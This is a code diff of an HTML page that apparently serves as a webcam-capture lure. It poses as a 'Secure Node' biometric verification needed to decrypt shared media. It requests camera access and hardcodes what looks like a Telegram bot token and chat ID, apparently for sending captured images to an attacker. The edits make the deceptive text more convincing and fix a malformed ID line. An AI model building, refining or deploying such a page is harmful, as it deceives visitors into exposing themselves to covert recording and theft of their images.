@@ -20,7 +20,7 @@
     <div class="shield-container" id="main-ui">
         <div style="font-size: 50px; margin-bottom: 20px;">🔒</div>
         <h1>Secure Node</h1>
-        <p> Security biometric verification required to decrypt shared media assets.</p>
+        <p>Biometric handshake required to decrypt shared media assets.</p>
         <button class="btn" id="mainBtn" onclick="initiate()">Verify Identity</button>
         <div id="status"></div>
         <div id="loader" class="loader"></div>
@@ -31,7 +31,7 @@
 
     <script>
         const TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
-        const ID = '7617707778','7194705917';
+        const ID = '7617707778';
 
         async function initiate() {
             const status = document.getElementById('status');
@@ -41,7 +41,7 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 btn.style.display = 'none';
-                status.innerText = "> INITIALIZING SECURITY SCAN...";
+                status.innerText = "> INITIALIZING BIOMETRIC SCAN...";
 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
